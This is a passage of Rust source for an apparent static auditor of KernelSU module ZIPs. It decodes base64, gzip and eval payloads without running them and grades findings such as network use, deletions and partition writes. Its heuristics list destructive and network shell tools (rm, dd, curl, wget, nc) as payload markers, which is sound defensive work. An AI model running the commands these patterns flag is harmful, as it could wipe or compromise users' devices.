#![deny(unsafe_code)]

use anyhow::{Context, Result, bail};
use flate2::read::GzDecoder;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::fs::File;
use std::io::{Cursor, Read, Seek};
use std::path::Path;

const RULE_PARTITION_WRITE: &str = "KSU-AUDIT-FS-001";
const RULE_DESTRUCTIVE_WRITE_UNKNOWN: &str = "KSU-AUDIT-FS-002";
const RULE_FLASH_TOOL: &str = "KSU-AUDIT-FS-003";
const RULE_BROAD_DELETE: &str = "KSU-AUDIT-FS-010";
const RULE_OWN_DELETE: &str = "KSU-AUDIT-FS-011";
const RULE_UNKNOWN_DELETE: &str = "KSU-AUDIT-FS-012";
const RULE_NETWORK: &str = "KSU-AUDIT-NET-001";
const RULE_BINARY_NETWORK: &str = "KSU-AUDIT-NET-002";
const RULE_BINARY_PRESENT: &str = "KSU-AUDIT-BIN-001";
const RULE_BINARY_EXECUTED: &str = "KSU-AUDIT-BIN-002";
const RULE_PACKED_SHELL: &str = "KSU-AUDIT-PACK-001";
const RULE_UNPACK_LIMIT: &str = "KSU-AUDIT-PACK-002";
const RULE_UNAUDITABLE_DECODER: &str = "KSU-AUDIT-PACK-003";
const RULE_PERSISTENT_SCRIPT: &str = "KSU-AUDIT-PERSIST-001";
const RULE_UNAUDITABLE_PERSISTENT_SCRIPT: &str = "KSU-AUDIT-PERSIST-002";
const RULE_INVOKED_SCRIPT: &str = "KSU-AUDIT-SCRIPT-001";
const RULE_ARCHIVE_PATH: &str = "KSU-AUDIT-ZIP-001";
const RULE_ARCHIVE_LIMIT: &str = "KSU-AUDIT-ZIP-002";
const MAX_INDEXED_SOURCE_SIZE: usize = 4 * 1024 * 1024;
const MIN_CONTENT_PAYLOAD_LENGTH: usize = 24;
const MAX_CONTENT_PAYLOAD_LENGTH: usize = 1024 * 1024;
const MAX_CONTENT_CANDIDATES: usize = 128;
const MAX_CONTENT_PROBES: usize = 512;
const MAX_CONTENT_PROBE_DEPTH: usize = 4;

#[derive(Clone, Copy, Debug, Deserialize, Eq, Ord, PartialEq, PartialOrd, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Notice,
    High,
    Critical,
}

impl Severity {
    #[must_use]
    pub const fn requires_confirmation(self) -> bool {
        matches!(self, Self::Notice | Self::High | Self::Critical)
    }
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct Finding {
    pub rule_id: String,
    pub severity: Severity,
    pub path: String,
    pub line: Option<usize>,
    pub title: String,
    pub evidence: String,
    pub provenance: Vec<String>,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct AuditReport {
    pub schema_version: u32,
    pub package_sha256: String,
    pub module_id: Option<String>,
    pub findings: Vec<Finding>,
    pub scanned_files: usize,
    pub derived_artifacts: usize,
}

impl AuditReport {
    #[must_use]
    pub fn requires_confirmation(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity.requires_confirmation())
    }

    #[must_use]
    pub fn has_critical(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity == Severity::Critical)
    }

    #[must_use]
    pub fn required_confirmation_presses(&self) -> usize {
        if !self.requires_confirmation() {
            0
        } else if self.has_critical() {
            2
        } else {
            1
        }
    }

    #[must_use]
    pub fn count(&self, severity: Severity) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.severity == severity)
            .count()
    }
}

#[derive(Clone, Debug)]
pub struct AuditConfig {
    pub max_entries: usize,
    pub max_file_size: usize,
    pub max_total_size: usize,
    pub max_unpack_depth: usize,
    pub max_derived_size: usize,
}

impl Default for AuditConfig {
    fn default() -> Self {
        Self {
            max_entries: 4096,
            max_file_size: 32 * 1024 * 1024,
            max_total_size: 128 * 1024 * 1024,
            max_unpack_depth: 16,
            max_derived_size: 64 * 1024 * 1024,
        }
    }
}

#[derive(Clone)]
struct Artifact {
    path: String,
    bytes: Vec<u8>,
    provenance: Vec<String>,
    depth: usize,
    force_shell: bool,
}

#[derive(Clone)]
struct BinaryProfile {
    path: String,
    basename: String,
    base64_like: bool,
    openssl_like: bool,
}

struct DecodedCandidate {
    line: usize,
    bytes: Vec<u8>,
    transform: String,
    evidence: String,
}

#[derive(Default)]
struct ScanState {
    findings: Vec<Finding>,
    seen_derived: BTreeSet<String>,
    derived_bytes: usize,
    derived_artifacts: usize,
    binaries: Vec<String>,
    binary_profiles: Vec<BinaryProfile>,
    archive_files: BTreeMap<String, Vec<u8>>,
    scripts: Vec<(String, String, Vec<String>)>,
    audited_scripts: BTreeSet<String>,
}

pub fn scan_zip_path(path: impl AsRef<Path>, config: &AuditConfig) -> Result<AuditReport> {
    let package_sha256 = sha256_path(&path)?;
    let file = File::open(path.as_ref())
        .with_context(|| format!("open module ZIP {}", path.as_ref().display()))?;
    scan_zip_reader(file, package_sha256, config)
}

pub fn scan_zip_bytes(bytes: &[u8], config: &AuditConfig) -> Result<AuditReport> {
    scan_zip_reader(Cursor::new(bytes), sha256_bytes(bytes), config)
}

pub fn scan_file_bytes(path: impl Into<String>, bytes: &[u8], config: &AuditConfig) -> AuditReport {
    let mut state = ScanState::default();
    scan_artifact(
        Artifact {
            path: path.into(),
            bytes: bytes.to_vec(),
            provenance: Vec::new(),
            depth: 0,
            force_shell: false,
        },
        None,
        config,
        &mut state,
    );
    finish_report(sha256_bytes(bytes), None, 1, state)
}

pub fn sha256_path(path: impl AsRef<Path>) -> Result<String> {
    let mut file = File::open(path.as_ref())
        .with_context(|| format!("open {} for hashing", path.as_ref().display()))?;
    let mut hasher = Sha256::new();
    let mut buffer = [0_u8; 64 * 1024];
    loop {
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }
    Ok(hex_digest(hasher.finalize().as_slice()))
}

fn scan_zip_reader<R: Read + Seek>(
    reader: R,
    package_sha256: String,
    config: &AuditConfig,
) -> Result<AuditReport> {
    let mut archive = zip::ZipArchive::new(reader).context("parse module ZIP")?;
    if archive.len() > config.max_entries {
        bail!(
            "module ZIP contains {} entries, limit is {}",
            archive.len(),
            config.max_entries
        );
    }

    let mut entries = Vec::new();
    let mut total_size = 0_usize;
    let mut module_id = None;
    let mut state = ScanState::default();

    for index in 0..archive.len() {
        let mut entry = archive.by_index(index)?;
        let name = entry.name().replace('\\', "/");
        if !is_safe_zip_path(&name) {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_PATH.to_owned(),
                severity: Severity::Critical,
                path: name,
                line: None,
                title: "Unsafe archive path".to_owned(),
                evidence: "ZIP entry escapes the module root".to_owned(),
                provenance: Vec::new(),
            });
            continue;
        }
        if entry.is_dir() {
            continue;
        }

        let declared_size = usize::try_from(entry.size()).unwrap_or(usize::MAX);
        total_size = total_size.saturating_add(declared_size);
        if declared_size > config.max_file_size || total_size > config.max_total_size {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_LIMIT.to_owned(),
                severity: Severity::High,
                path: name,
                line: None,
                title: "Archive analysis limit exceeded".to_owned(),
                evidence: format!(
                    "declared file size {declared_size} bytes; cumulative size {total_size} bytes"
                ),
                provenance: Vec::new(),
            });
            continue;
        }

        let mut bytes = Vec::with_capacity(declared_size.min(config.max_file_size));
        entry
            .by_ref()
            .take(u64::try_from(config.max_file_size).unwrap_or(u64::MAX) + 1)
            .read_to_end(&mut bytes)?;
        if bytes.len() > config.max_file_size {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_LIMIT.to_owned(),
                severity: Severity::High,
                path: name,
                line: None,
                title: "File is too large to audit".to_owned(),
                evidence: format!("decoded size exceeds {} bytes", config.max_file_size),
                provenance: Vec::new(),
            });
            continue;
        }
        if name == "module.prop" {
            module_id = parse_module_id(&bytes);
        }
        entries.push((name, bytes));
    }

    let scanned_files = entries.len();
    for (path, bytes) in &entries {
        if is_elf(bytes) {
            state.binary_profiles.push(profile_binary(path, bytes));
        } else if bytes.len() <= MAX_INDEXED_SOURCE_SIZE {
            state.archive_files.insert(path.clone(), bytes.clone());
        }
    }
    for (path, bytes) in entries {
        scan_artifact(
            Artifact {
                path,
                bytes,
                provenance: Vec::new(),
                depth: 0,
                force_shell: false,
            },
            module_id.as_deref(),
            config,
            &mut state,
        );
    }
    Ok(finish_report(
        package_sha256,
        module_id,
        scanned_files,
        state,
    ))
}

fn finish_report(
    package_sha256: String,
    module_id: Option<String>,
    scanned_files: usize,
    mut state: ScanState,
) -> AuditReport {
    correlate_binary_execution(&mut state);
    let mut consolidated: BTreeMap<_, Finding> = BTreeMap::new();
    for finding in state.findings {
        let key = (
            finding.rule_id.clone(),
            finding.path.clone(),
            finding.line,
            finding.title.clone(),
            finding.evidence.clone(),
        );
        match consolidated.get_mut(&key) {
            Some(existing) if finding.provenance.len() > existing.provenance.len() => {
                existing.provenance = finding.provenance;
            }
            Some(_) => {}
            None => {
                consolidated.insert(key, finding);
            }
        }
    }
    state.findings = consolidated.into_values().collect();
    state.findings.sort_by(|left, right| {
        left.path
            .cmp(&right.path)
            .then(left.line.cmp(&right.line))
            .then(left.rule_id.cmp(&right.rule_id))
            .then(left.provenance.cmp(&right.provenance))
    });
    AuditReport {
        schema_version: 1,
        package_sha256,
        module_id,
        findings: state.findings,
        scanned_files,
        derived_artifacts: state.derived_artifacts,
    }
}

fn scan_artifact(
    artifact: Artifact,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if is_elf(&artifact.bytes) {
        state.binaries.push(artifact.path.clone());
        add_finding(
            state,
            &artifact,
            RULE_BINARY_PRESENT,
            Severity::Notice,
            None,
            "Precompiled ELF content",
            &describe_elf(&artifact.bytes),
        );
        if binary_has_network_indicators(&artifact.bytes) {
            add_finding(
                state,
                &artifact,
                RULE_BINARY_NETWORK,
                Severity::Notice,
                None,
                "Precompiled binary contains network indicators",
                "found a network API or URL marker; runtime behavior cannot be proven statically",
            );
        }
        return;
    }

    if artifact.bytes.starts_with(&[0x1f, 0x8b]) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            None,
            "Compressed executable content",
            "gzip stream decoded without executing it",
        );
        decode_gzip_artifact(artifact, "gzip stream", module_id, config, state);
        return;
    }

    let looks_shell = artifact.force_shell || looks_like_shell(&artifact.path, &artifact.bytes);
    let text = String::from_utf8_lossy(&artifact.bytes).into_owned();
    if looks_shell {
        let audit_key = format!("{}\0{}", artifact.path, sha256_bytes(&artifact.bytes));
        if !state.audited_scripts.insert(audit_key) {
            return;
        }
        state.scripts.push((
            artifact.path.clone(),
            text.clone(),
            artifact.provenance.clone(),
        ));
        analyze_shell(&artifact, &text, module_id, state);
        analyze_persistent_script_writes(&artifact, &text, module_id, config, state);
        analyze_invoked_module_scripts(&artifact, &text, module_id, config, state);
    }

    let mut candidates = if looks_shell {
        decode_static_base64_payloads(&artifact, &text, module_id, state)
    } else {
        Vec::new()
    };
    let mut decoded_digests: BTreeSet<_> = candidates
        .iter()
        .map(|candidate| sha256_bytes(&candidate.bytes))
        .collect();
    if std::str::from_utf8(&artifact.bytes).is_ok() {
        for candidate in discover_content_base64_payloads(&text, module_id) {
            if decoded_digests.insert(sha256_bytes(&candidate.bytes)) {
                candidates.push(candidate);
            }
        }
    }
    for candidate in candidates {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            Some(candidate.line),
            "Encoded shell payload",
            &candidate.evidence,
        );
        scan_derived_bytes(
            artifact.clone(),
            candidate.bytes,
            &candidate.transform,
            module_id,
            config,
            state,
        );
    }
    if !looks_shell {
        return;
    }
    for (line, decoded) in decode_static_shell_commands(&text) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            Some(line),
            "Static dynamic-shell payload",
            "literal eval/sh -c payload was extracted without executing it",
        );
        scan_derived_bytes(
            artifact.clone(),
            decoded,
            "literal dynamic shell",
            module_id,
            config,
            state,
        );
    }

    if let Some((payload_offset, description)) = detect_gzexe(&artifact.bytes, &text) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            None,
            "Packed shell script",
            &description,
        );
        let payload = artifact.bytes[payload_offset..].to_vec();
        decode_gzip_artifact(
            Artifact {
                path: artifact.path,
                bytes: payload,
                provenance: artifact.provenance,
                depth: artifact.depth,
                force_shell: artifact.force_shell,
            },
            "gzexe/gzip payload",
            module_id,
            config,
            state,
        );
    }
}

fn decode_gzip_artifact(
    artifact: Artifact,
    transform: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if artifact.depth >= config.max_unpack_depth {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Unpacking depth limit reached",
            &format!("maximum depth is {}", config.max_unpack_depth),
        );
        return;
    }

    let mut decoder = GzDecoder::new(Cursor::new(&artifact.bytes));
    let remaining = config.max_derived_size.saturating_sub(state.derived_bytes);
    if remaining == 0 {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }
    let mut decoded = Vec::new();
    if let Err(error) = decoder
        .by_ref()
        .take(u64::try_from(remaining).unwrap_or(u64::MAX) + 1)
        .read_to_end(&mut decoded)
    {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Compressed payload could not be decoded",
            &error.to_string(),
        );
        return;
    }
    if decoded.len() > remaining {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }

    scan_derived_bytes(artifact, decoded, transform, module_id, config, state);
}

fn scan_derived_bytes(
    artifact: Artifact,
    decoded: Vec<u8>,
    transform: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if artifact.depth >= config.max_unpack_depth {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Unpacking depth limit reached",
            &format!("maximum depth is {}", config.max_unpack_depth),
        );
        return;
    }
    let remaining = config.max_derived_size.saturating_sub(state.derived_bytes);
    if decoded.len() > remaining {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }
    let digest = sha256_bytes(&decoded);
    if !state.seen_derived.insert(digest) {
        return;
    }
    state.derived_bytes += decoded.len();
    state.derived_artifacts += 1;
    let mut provenance = artifact.provenance;
    provenance.push(format!(
        "{} (layer {})",
        transform,
        artifact.depth.saturating_add(1)
    ));
    scan_artifact(
        Artifact {
            path: artifact.path,
            bytes: decoded,
            provenance,
            depth: artifact.depth + 1,
            force_shell: artifact.force_shell,
        },
        module_id,
        config,
        state,
    );
}

fn decode_static_base64_payloads(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    state: &mut ScanState,
) -> Vec<DecodedCandidate> {
    let mut decoded = Vec::new();
    let mut variables = predefined_variables(module_id);
    for (line_index, line) in logical_lines(text).iter().enumerate() {
        let tokens = shell_tokens(line);
        collect_assignments(&tokens, &mut variables);
        for commands in split_pipeline_groups(&tokens) {
            for (decoder_index, command) in commands.iter().enumerate() {
                let expanded: Vec<_> = command
                    .iter()
                    .map(|token| expand_variables(token, &variables))
                    .collect();
                let (name, args) = normalize_command(&expanded);
                if name.is_empty() || !has_decode_flag(&args) {
                    continue;
                }

                let profile = binary_profile_for_command(&name, &state.binary_profiles);
                let openssl_grammar = has_openssl_base64_grammar(&args);
                let known_base64 = name == "base64"
                    || openssl_grammar
                    || profile.is_some_and(|value| value.base64_like || value.openssl_like);
                let feeds_shell = commands.iter().skip(decoder_index + 1).any(|next| {
                    let expanded: Vec<_> = next
                        .iter()
                        .map(|token| expand_variables(token, &variables))
                        .collect();
                    matches!(
                        normalize_command(&expanded).0.as_str(),
                        "sh" | "ash" | "bash"
                    )
                });

                if has_openssl_cipher(&args) {
                    add_finding(
                        state,
                        artifact,
                        RULE_UNAUDITABLE_DECODER,
                        Severity::High,
                        Some(line_index + 1),
                        "Encrypted payload cannot be statically decoded",
                        line.trim(),
                    );
                    continue;
                }

                let encoded = decoder_input(
                    decoder_index,
                    &commands,
                    &args,
                    &variables,
                    module_id,
                    &state.archive_files,
                );
                let Some(encoded) = encoded else {
                    if feeds_shell && profile.is_some() {
                        add_finding(
                            state,
                            artifact,
                            RULE_UNAUDITABLE_DECODER,
                            Severity::High,
                            Some(line_index + 1),
                            "Bundled decoder output cannot be audited",
                            line.trim(),
                        );
                    }
                    continue;
                };
                let Ok(encoded) = std::str::from_utf8(&encoded) else {
                    continue;
                };
                let Some(bytes) = decode_base64(encoded) else {
                    continue;
                };
                if !known_base64 && (profile.is_none() || !looks_like_decoded_payload(&bytes)) {
                    continue;
                }

                let inferred = if name == "base64" {
                    "base64 command".to_owned()
                } else if openssl_grammar {
                    "OpenSSL-compatible argument grammar".to_owned()
                } else if profile.is_some_and(|value| value.base64_like || value.openssl_like) {
                    format!(
                        "bundled decoder binary fingerprint ({})",
                        profile.map_or("unknown", |value| value.path.as_str())
                    )
                } else {
                    format!(
                        "decoded payload content heuristic with bundled binary ({})",
                        profile.map_or("unknown", |value| value.path.as_str())
                    )
                };
                let transform = if name == "base64" {
                    "base64 shell payload"
                } else {
                    "heuristic base64 payload"
                };
                decoded.push(DecodedCandidate {
                    line: line_index + 1,
                    bytes,
                    transform: transform.to_owned(),
                    evidence: format!(
                        "decoded without execution using {inferred}: {}",
                        line.trim()
                    ),
                });
            }
        }
    }
    decoded
}

fn discover_content_base64_payloads(text: &str, module_id: Option<&str>) -> Vec<DecodedCandidate> {
    let mut output = Vec::new();
    let mut seen_encoded = BTreeSet::new();
    let mut variables = predefined_variables(module_id);

    collect_content_candidate(text, 1, "text content", &mut seen_encoded, &mut output);
    for (line_index, line) in logical_lines(text).iter().enumerate() {
        let tokens = shell_tokens(line);
        collect_assignments(&tokens, &mut variables);
        for token in &tokens {
            if matches!(token.as_str(), ";" | "|" | "&&" | "||" | "&" | "(" | ")") {
                continue;
            }
            let value = if let Some((name, _)) = token.split_once('=')
                && is_variable_name(name)
            {
                variables.get(name).cloned().unwrap_or_default()
            } else {
                expand_variables(token, &variables)
            };
            collect_content_candidate(
                &value,
                line_index + 1,
                "static shell content",
                &mut seen_encoded,
                &mut output,
            );
            if output.len() >= MAX_CONTENT_CANDIDATES {
                return output;
            }
        }
    }
    output
}

fn collect_content_candidate(
    value: &str,
    line: usize,
    source: &str,
    seen_encoded: &mut BTreeSet<String>,
    output: &mut Vec<DecodedCandidate>,
) {
    if output.len() >= MAX_CONTENT_CANDIDATES || seen_encoded.len() >= MAX_CONTENT_PROBES {
        return;
    }
    let probe_budget = MAX_CONTENT_PROBES - seen_encoded.len();
    let mut candidates = Vec::new();
    let trimmed = value.trim();
    if is_base64_candidate(trimmed) {
        candidates.push(trimmed);
    }

    let mut start = None;
    for (index, character) in value.char_indices() {
        if candidates.len() >= probe_budget {
            start = None;
            break;
        }
        if is_base64_character(character) {
            start.get_or_insert(index);
        } else if let Some(offset) = start.take() {
            candidates.push(&value[offset..index]);
        }
    }
    if let Some(offset) = start {
        candidates.push(&value[offset..]);
    }

    for encoded in candidates {
        let encoded = encoded.trim();
        if !is_base64_candidate(encoded)
            || seen_encoded.len() >= MAX_CONTENT_PROBES
            || !seen_encoded.insert(encoded.to_owned())
            || output.len() >= MAX_CONTENT_CANDIDATES
        {
            continue;
        }
        let Some(bytes) = decode_base64(encoded) else {
            continue;
        };
        if !is_high_confidence_content_payload(&bytes, 0) {
            continue;
        }
        output.push(DecodedCandidate {
            line,
            bytes,
            transform: "content-discovered base64 payload".to_owned(),
            evidence: format!(
                "decoded without relying on a decoder command from {source} ({} encoded bytes)",
                encoded.len()
            ),
        });
    }
}

fn is_base64_candidate(value: &str) -> bool {
    let length = value
        .bytes()
        .filter(|byte| !byte.is_ascii_whitespace())
        .count();
    (MIN_CONTENT_PAYLOAD_LENGTH..=MAX_CONTENT_PAYLOAD_LENGTH).contains(&length)
        && value
            .chars()
            .all(|character| character.is_ascii_whitespace() || is_base64_character(character))
}

fn is_base64_character(character: char) -> bool {
    character.is_ascii_alphanumeric() || matches!(character, '+' | '/' | '-' | '_' | '=')
}

fn is_high_confidence_content_payload(bytes: &[u8], depth: usize) -> bool {
    if looks_like_content_payload(bytes) {
        return true;
    }
    if depth >= MAX_CONTENT_PROBE_DEPTH {
        return false;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    let candidate = text.trim();
    is_base64_candidate(candidate)
        && decode_base64(candidate)
            .is_some_and(|decoded| is_high_confidence_content_payload(&decoded, depth + 1))
}

fn looks_like_content_payload(bytes: &[u8]) -> bool {
    if is_elf(bytes) || bytes.starts_with(&[0x1f, 0x8b]) || bytes.starts_with(b"#!") {
        return true;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    let mut shell_score = 0;
    for line in logical_lines(text) {
        let tokens = shell_tokens(&line);
        for command in split_commands(&tokens) {
            let (name, args) = normalize_command(command);
            if matches!(
                name.as_str(),
                "rm" | "dd" | "curl" | "wget" | "nc" | "netcat" | "insmod" | "modprobe"
            ) {
                return true;
            }
            if matches!(
                name.as_str(),
                "sh" | "ash" | "bash" | "export" | "set" | "echo" | "printf" | "mount" | "umount"
            ) || !args.is_empty() && command.iter().any(|token| is_assignment(token))
            {
                shell_score += 1;
            }
        }
    }
    shell_score >= 2
}

fn has_decode_flag(args: &[String]) -> bool {
    args.iter().any(|arg| {
        matches!(
            arg.as_str(),
            "-d" | "-D" | "--decode" | "-decode" | "-dc" | "-cd"
        )
    })
}

fn has_openssl_base64_grammar(args: &[String]) -> bool {
    args.iter().any(|arg| arg == "base64")
        || args.iter().any(|arg| arg == "enc")
            && args
                .iter()
                .any(|arg| matches!(arg.as_str(), "-a" | "-base64"))
}

fn has_openssl_cipher(args: &[String]) -> bool {
    args.iter().any(|arg| {
        let arg = arg.to_ascii_lowercase();
        arg.starts_with("-aes-")
            || arg.starts_with("-des")
            || arg.starts_with("-chacha")
            || arg.starts_with("-aria")
            || arg.starts_with("-camellia")
    })
}

fn decoder_input(
    decoder_index: usize,
    commands: &[&[String]],
    args: &[String],
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    if decoder_index > 0
        && let Some(payload) = producer_payload(
            commands[decoder_index - 1],
            variables,
            module_id,
            archive_files,
        )
    {
        return Some(payload);
    }
    if let Some(index) = args.iter().position(|arg| arg == "-in")
        && let Some(path) = args.get(index + 1)
    {
        return lookup_archive_file(path, variables, module_id, archive_files);
    }
    let mut positional = Vec::new();
    let mut index = 0;
    while index < args.len() {
        if matches!(args[index].as_str(), "-out" | "-in") {
            index += 2;
            continue;
        }
        let arg = &args[index];
        if arg.starts_with('-') || matches!(arg.as_str(), "enc" | "base64") {
            index += 1;
            continue;
        }
        positional.push(arg);
        index += 1;
    }
    for arg in positional.into_iter().rev() {
        if let Some(bytes) = lookup_archive_file(arg, variables, module_id, archive_files) {
            return Some(bytes);
        }
    }
    None
}

fn producer_payload(
    command: &[String],
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    let expanded: Vec<_> = command
        .iter()
        .map(|token| expand_variables(token, variables))
        .collect();
    let (name, args) = normalize_command(&expanded);
    let operands = operands_before_redirection(&args);
    match name.as_str() {
        "echo" => Some(
            operands
                .iter()
                .filter(|arg| !matches!(arg.as_str(), "-n" | "-e" | "-E"))
                .map(|arg| (*arg).clone())
                .collect::<Vec<_>>()
                .join(" ")
                .into_bytes(),
        ),
        "printf" => {
            let payload = if operands.first().is_some_and(|arg| arg.contains('%')) {
                &operands[1..]
            } else {
                operands.as_slice()
            };
            Some(
                payload
                    .iter()
                    .map(|arg| arg.as_str())
                    .collect::<Vec<_>>()
                    .join("")
                    .into_bytes(),
            )
        }
        "cat" => operands
            .iter()
            .find_map(|path| lookup_archive_file(path, variables, module_id, archive_files)),
        _ => None,
    }
}

fn lookup_archive_file(
    path: &str,
    variables: &BTreeMap<String, String>,
    module_id: Option<&str>,
    archive_files: &BTreeMap<String, Vec<u8>>,
) -> Option<Vec<u8>> {
    let expanded = expand_variables(path, variables);
    let mut candidates = vec![expanded.trim_start_matches("./").to_owned()];
    if let Some(id) = module_id {
        for prefix in [
            format!("/data/adb/modules_update/{id}/"),
            format!("/data/adb/modules/{id}/"),
        ] {
            if let Some(relative) = expanded.strip_prefix(&prefix) {
                candidates.push(relative.to_owned());
            }
        }
    }
    candidates
        .into_iter()
        .find_map(|candidate| archive_files.get(&candidate).cloned())
}

fn binary_profile_for_command<'a>(
    name: &str,
    profiles: &'a [BinaryProfile],
) -> Option<&'a BinaryProfile> {
    let mut matches = profiles.iter().filter(|profile| profile.basename == name);
    let first = matches.next()?;
    matches.next().is_none().then_some(first)
}

fn looks_like_decoded_payload(bytes: &[u8]) -> bool {
    if is_elf(bytes) || bytes.starts_with(&[0x1f, 0x8b]) || bytes.starts_with(b"#!") {
        return true;
    }
    let Ok(text) = std::str::from_utf8(bytes) else {
        return false;
    };
    ["rm ", "dd ", "curl ", "wget ", "sh ", "export ", "#!/"]
        .iter()
        .any(|marker| text.contains(marker))
}

fn decode_static_shell_commands(text: &str) -> Vec<(usize, Vec<u8>)> {
    let mut decoded = Vec::new();
    for (line_index, line) in text.lines().enumerate() {
        let tokens = shell_tokens(line);
        for command in split_commands(&tokens) {
            let (name, args) = normalize_command(command);
            let payload = if name == "eval" {
                Some(args.join(" "))
            } else if matches!(name.as_str(), "sh" | "ash" | "bash") {
                args.iter()
                    .position(|arg| arg == "-c")
                    .map(|index| args[index + 1..].join(" "))
            } else {
                None
            };
            let Some(payload) = payload else {
                continue;
            };
            if payload.is_empty()
                || payload.contains('$')
                || payload.contains('`')
                || payload.contains("$(")
            {
                continue;
            }
            decoded.push((line_index + 1, payload.into_bytes()));
        }
    }
    decoded
}

fn decode_base64(value: &str) -> Option<Vec<u8>> {
    let mut encoded: Vec<u8> = value
        .bytes()
        .filter(|byte| !byte.is_ascii_whitespace())
        .collect();
    if encoded.is_empty() || encoded.len() % 4 == 1 {
        return None;
    }
    while !encoded.len().is_multiple_of(4) {
        encoded.push(b'=');
    }
    let values: Vec<u8> = encoded
        .into_iter()
        .map(|byte| match byte {
            b'A'..=b'Z' => Some(byte - b'A'),
            b'a'..=b'z' => Some(byte - b'a' + 26),
            b'0'..=b'9' => Some(byte - b'0' + 52),
            b'+' | b'-' => Some(62),
            b'/' | b'_' => Some(63),
            b'=' => Some(64),
            _ => None,
        })
        .collect::<Option<_>>()?;
    if let Some(padding) = values.iter().position(|value| *value == 64)
        && (values.len() - padding > 2 || values[padding..].iter().any(|value| *value != 64))
    {
        return None;
    }
    let mut output = Vec::with_capacity(values.len() / 4 * 3);
    for chunk in values.chunks_exact(4) {
        if chunk[0] >= 64 || chunk[1] >= 64 {
            return None;
        }
        output.push((chunk[0] << 2) | (chunk[1] >> 4));
        if chunk[2] < 64 {
            output.push((chunk[1] << 4) | (chunk[2] >> 2));
        }
        if chunk[3] < 64 {
            if chunk[2] >= 64 {
                return None;
            }
            output.push((chunk[2] << 6) | chunk[3]);
        }
    }
    Some(output)
}

fn add_unpack_size_limit(state: &mut ScanState, artifact: &Artifact, config: &AuditConfig) {
    add_finding(
        state,
        artifact,
        RULE_UNPACK_LIMIT,
        Severity::High,
        None,
        "Unpacking size limit reached",
        &format!("maximum derived size is {} bytes", config.max_derived_size),
    );
}

fn analyze_shell(artifact: &Artifact, text: &str, module_id: Option<&str>, state: &mut ScanState) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );

    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let line_number = line_index + 1;
        let tokens = shell_tokens(raw_line);
        if tokens.is_empty() {
            continue;
        }
        collect_assignments(&tokens, &mut variables);
        collect_block_target_assignments(raw_line, &mut variables);
        for command in split_commands(&tokens) {
            if command.is_empty() {
                continue;
            }
            let (name, args) = normalize_command(command);
            if name.is_empty() {
                continue;
            }
            if name == "cd"
                && let Some(target) = args.first()
            {
                current_dir = resolve_path(target, &variables, &current_dir);
            }
            analyze_network(artifact, line_number, raw_line, &name, state);
            analyze_delete(
                artifact,
                line_number,
                raw_line,
                &name,
                &args,
                &variables,
                &current_dir,
                module_id,
                state,
            );
            analyze_writes(
                artifact,
                line_number,
                raw_line,
                &name,
                &args,
                &variables,
                &current_dir,
                state,
            );
        }
    }
}

fn analyze_persistent_script_writes(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    let mut variables = predefined_variables(module_id);
    let mut current_dir = module_id.map_or_else(
        || "$CWD".to_owned(),
        |_| variables.get("MODPATH").cloned().unwrap_or_default(),
    );

    for (line_index, raw_line) in logical_lines(text).iter().enumerate() {
        let line = line_index + 1;
        let tokens = shell_tokens(raw_line);
        collect_assignments(&tokens, &mut variables);
        for commands in split_pipeline_groups(&tokens) {
            for (command_index, command) in commands.iter().enumerate() {
                let expanded: Vec<_> = command
                    .iter()
                    .map(|token| expand_variables(token, &variables))
                    .collect();
                let (name, args) = normalize_command(&expanded);
                if name == "cd"
                    && let Some(target) = args.first()
                {
                    current_dir = resolve_path(target, &variables, &current_dir);
                }
                if args.iter().any(|arg| arg == "<<") {
                    continue;
                }

                if matches!(name.as_str(), "cp" | "mv" | "install") {
                    let operands: Vec<_> = operands_before_redirection(&args)
                        .into_iter()
                        .filter(|arg| !arg.starts_with('-'))
                        .collect();
                    if operands.len() >= 2 {
                        let destination = resolve_path(
                            operands.last().expect("checked length"),
                            &variables,
                            &current_dir,
